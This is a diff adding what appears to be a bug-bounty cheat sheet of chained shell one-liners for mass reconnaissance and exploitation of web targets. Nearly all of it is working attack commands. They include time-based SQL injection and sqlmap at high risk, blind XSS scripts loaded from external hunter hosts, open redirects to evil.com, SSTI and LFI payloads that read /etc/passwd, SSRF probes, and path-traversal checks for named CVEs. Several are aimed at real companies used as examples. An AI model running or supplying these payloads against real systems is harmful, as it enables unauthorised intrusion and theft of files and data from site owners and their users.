@@ -1,0 +1,231 @@
+🧪 Auto Scanners & Recon:
+subfinder -d site.com -all | naabu | httpx | nuclei -t nuclei-templates
+subfinder -d site.com -silent | httpx -silent | hakrawler | tr "[:punct:]" "\n" | sort -u > wordlist.txt
+puredns bruteforce wordlist.txt site.com -r resolvers.txt -w output.txt
+
+📂 File & URL Discovery:
+subfinder -d site.com -all | naabu | httpx | waybackurls | grep -E ".json(?:onp?)?$"
+waybackurls http://example.com | grep "url" | xargs -n 1 curl -s -o /dev/null -w "%{http_code} > %{url_effective}\n" | sort
+
+🛰️ Subdomain Enumeration:
+subfinder -d site.com -all | dnsprobe -silent | cut -d ' ' -f1 | grep --color 'dmz\|api\|staging\|env\|v1\|stag\|prod\|dev\|stg\|test\|demo\|pre\|admin\|beta\|vpn\|cdn\|coll\|sandbox\|qa\|intra\|extra\|s3\|external\|back'
+
+💉 SQL Injection:
+subfinder -d site.com -all -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt
+sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
+
+cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
+
+cat urls.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt
+
+🧭 Open Redirect: waybackurls TARGET.COM | grep -a -i '=http' | qsreplace 'http://evil.com' | while read host; do curl -s -L $host -I | grep "evil.com" && echo "$host VULNERABLE"; done
+
+🖥️ XSS (Cross-Site Scripting):
+waybackurls http://testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee XSS.txt
+cat XSS.txt | dalfox -b http://your.bxss.in pipe > output.txt
+
+Blind XSS Mass Hunt : cat domain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://your.bxss.in></script>"
+
+🧪 SSTI : echo "domain" | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep "root:x"
+
+cPanel CVE-2023-29489 XSS : subfinder -d example.com -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path '/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaaaaa' -mc 400
+
+CVE-2023-0126 SMA1000 Path Traversal : cat file.txt | while read host; do curl -sk "http://$host:8443/images//////////////////../../../../../../../../etc/passwd" | grep -i 'root:' && echo "$host is VULNERABLE"; done
+
+CVE-2023-23752 Joomla Improper Access : subfinder -d TARGET.COM -silent -all | httpx -silent -path 'api/index.php/v1/config/application?public=true' -mc 200
+
+🧪 NGINX Path Traversal : httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
+
+🔐 JS Endpoint & Secret Discovery:
+curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | awk -v url=https://example.com '{...}' | xargs -I '%' sh -c 'linkfinder.py -o cli -i %'
+echo TARGET.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript' | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt
+
+🔹 Using Amass with ASN : amass intel -org paypal -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500
+
+🔹 Chaos + Httpx + Gospider : chaos -d att.com | httpx -silent | xargs -I@ -P20 sh -c 'gospider -a -s "@" -d 2' | grep -Eo "(http|https)://[^/\"].*.js+" | anew | grep 'att\.com'
+
+🔹 Gospider Basic Crawl : gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
+
+🔹 Recon.dev + Gospider : curl "https://recon.dev/api/search?key=APIKEY&domain=paypal.com" | jq -r '.[].rawDomains[]' | anew | httpx -silent | xargs -I@ gospider -d 0 -s @ -c 5 -t 100 -d 5 --blacklist ...
+
+🔹 Cert.sh Subdomain Discovery : curl -s "https://crt.sh/?q=%25.att.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | httpx -title -silent | anew
+
+🔹 SQLi Scan via qsreplace + httpx : grep "=" .txt | qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output && echo "Likely Vulnerable"
+
+🔹 Open Redirect with GF + Waybackurls : echo "domain.com" | waybackurls | gf redirect | httpx -silent | anew
+
+🔹 XSS via QSReplace (Spidered URLs) : gospider -S domain.txt -t 3 -c 100 | grep "=" | grep "https://" | qsreplace '%22><svg%20onload=confirm(1);>'
+
+🧰 Automation Tools:
+chaos -d domain.com | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @
+shodan domain domain.com | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
+assetfinder -subs-only tesla.com | httpx -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"
+
+📁 Sensitive Files & Endpoints:
+assetfinder -subs-only domain.com | sed 's#$#/.git/HEAD#' | httpx -silent -status-code 301,302 -title | anew
+export domain="https://target"; gospider -s $domain -d 3 -c 300 | awk '/linkfinder/{print $NF}' | unfurl paths | xargs -I@ sh -c 'echo $domain@ | httpx'
+
+Subdomain Enumeration & Asset Discovery:
+# Find Subdomains + Check Alive : subfinder -d target.com -silent | httpx -silent -o urls.txt
+
+# Find Subdomains & Crawl : gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
+
+# Extract .git/HEAD endpoints : curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
+
+# Check .git/HEAD on domains : wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv
+cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
+
+# Dump Bugcrowd In-Scope Assets : curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
+
+# Recon.dev API asset discovery : curl "https://recon.dev/api/search?key=YOURAPIKEY&domain=target.com" | jq -r '.[].rawDomains[]' | sed 's/ //g' | anew | httpx -silent | xargs -I@ gospider -d 0 -s @ -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
+
+XSS:
+
+# Single target XSS find with gospider + dalfox (cihanmehmet)
+gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}' | grep "=" | qsreplace -a | dalfox pipe -o result.txt
+
+# Multi-target XSS (cihanmehmet)
+gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}' | grep "=" | qsreplace -a | dalfox pipe -o result.txt
+
+# Hakrawler + Wayback XSS scanning (dwisiswant0)
+hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://your.xss.ht
+
+# Kxss on waybackurls (KingOfBugbounty)
+echo http://testphp.vulnweb.com/ | waybackurls | kxss
+
+# gospider XSS hunting (ofjaaah)
+gospider -S domain.txt -t 3 -c 100 | tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
+
+# Blind XSS in URL Parameters (ethicalhackingplayground)
+subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
+
+# Blind XSS in X-Forwarded-For Header (ethicalhackingplayground)
+subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"
+
+# Gxss single target (KathanP19)
+echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
+
+# XSS using gf for a single target (infosecMatter)
+echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | anew
+
+# XSS without gf (HacktifyS)
+waybackurls testphp.vulnweb.com | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m Vulnerable"; done
+
+# XSS qsreplace (KingOfBugBounty)
+gospider -a -s https://site.com -t 3 -c 100 | tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
+
+# Automate XSS testing with dalfox & gf (Medium writeup)
+cat test.txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | tee testxss.txt
+dalfox file testxss.txt -b yours-xss-hunter-domain
+
+# XSS frequency count (ofjaaah)
+echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
+
+# XSS + knoxss (ofjaaah)
+echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\""}' | sh
+
+SQL Injection:
+# SQLi scan with sqlmap from waybackurls (ofjaaah)
+findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli
+sqlmap -m sqli -batch --random-agent --level 1
+
+# SQLi search with qsreplace syntax error injection (KingOfBugbounty)
+grep "="  .txt | qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
+
+# Time-based SQLi scanner (slv0d)
+gau DOMAIN.tld | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while read host; do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ; done
+
+SSRF : 
+# Recon for SSRF test URLs (KingOfBugbounty)
+findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau | grep "=" | qsreplace http://YOUR.burpcollaborator.net
+
+Local File Inclusion (LFI):
+# LFI discovery using gf + qsreplace (dwisiswant0)
+gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+
+Directory & Content Discovery:
+# Feroxbuster basic usage (epi052)
+feroxbuster -u https://target.com --insecure -d 1 -e -L 4 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+
+# Feroxbuster with multiple extensions (epi052)
+feroxbuster -u http://127.1 -x pdf -x js,html -x php txt json,docx
+
+# Feroxbuster with input from stdin and output to file
+cat urls.txt | feroxbuster -u - -w wordlist.txt -o results.txt
+
+Misc / Recon & Info Gathering:
+# Basic curl info gather (danielmiessler)
+curl -I https://target.com
+
+# nmap scan for open ports and services (nmap)
+nmap -sV -T4 -oN scan.txt target.com
+
+# Fetch SSL info (sslyze)
+sslyze --regular target.com
+
+# Get technology stack info (whatweb)
+whatweb -v target.com
+
+# Fetch IP info for subdomains (massdns + masscan)
+massdns -r resolvers.txt -t A -o S -w results.txt subdomains.txt
+masscan -p0-65535 --rate=1000 -iL results.txt
+
+Automation & Workflow Helpers:
+# Parallel run subfinder, assetfinder, amass
+(subfinder -d target.com & assetfinder -subs-only target.com & amass enum -passive -d target.com) | tee domains.txt
+
+# Combine and dedupe domains
+cat domains.txt | sort -u > domains-clean.txt
+
+# Use anew for appending unique entries
+cat newdomains.txt | anew domains-clean.txt
+
+# Quick grep for endpoints with parameters
+cat urls.txt | grep "="
+
+# Extract urls from waybackmachine via gau
+gau target.com
+
+# Use qsreplace for parameter fuzzing
+cat urls.txt | qsreplace "FUZZ"
+
+# Quick HTTP status check
+cat urls.txt | httpx -silent -status-code
+
+# Filter URLs with specific status codes
+cat urls.txt | httpx -silent -status-code 200,301,302
+
+🛠️ Reconnaissance:
+subfinder -d site.com -all
+subfinder -d site.com -all -silent | httpx -silent | hakrawler | tr "[:punct:]" "\n" | sort -u > wordlist.txt
+puredns bruteforce wordlist.txt site.com -r resolvers.txt -w output.txt
+
+subfinder -d site.com -all | dnsprobe -silent | cut -d ' ' -f1 | grep --color 'dmz\|api\|staging\|env\|v1\|stag\|prod\|dev\|stg\|test\|demo\|pre\|admin\|beta\|vpn\|cdn\|coll\|sandbox\|qa\|intra\|extra\|s3\|external\|back'
+
+🐾 URL Collection:
+waybackurls http://example.com | grep "url" | xargs -n 1 curl -s -o /dev/null -w "%{http_code} > %{url_effective}\n" | sort
+subfinder -d site.com -all | naabu | httpx | waybackurls | grep -E ".json(?:onp?)?$"
+
+🔥 Vulnerability Scanning:
+subfinder -d site.com -all | naabu | httpx | nuclei -t nuclei-templates
+subfinder -d site.com -all -silent | httpx -silent | nuclei -rl 50 -c 15 -timeout 10 -tags cisa -vv
+subfinder -d site.com -all | httpx | nuclei -t ~/nuclei-templates/
+
+🧪 Injection Attacks:
+subfinder -d site.com -all -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt
+sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
+
+subfinder -d site.com -all -silent | waybackurls | sort -u | gf redirect | qsreplace 'https://example.com' | httpx -fr -title --match-string 'Example Domain'
+
+echo "domain" | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
+
+Nnap:
+
+nmap --script dns-brute --script-args dns-brute.domain=domain.com,dns-brute.threads=6,dns-brute.hostlist=./sub1000.lst
+
+nmap --script dns-brute --script-args dns-brute.domain=domain.com,dns-brute.threads=6,dns-brute.hostlist=./sub10000.lst
+
+nmap --script dns-brute --script-args dns-brute.domain=domain.com,dns-brute.threads=6,dns-brute.hostlist=./sub100000.lst
+
+nmap --script dns-brute --script-args dns-brute.domain=domain.com,dns-brute.threads=6,dns-brute.hostlist=./sub1000000.lst
+
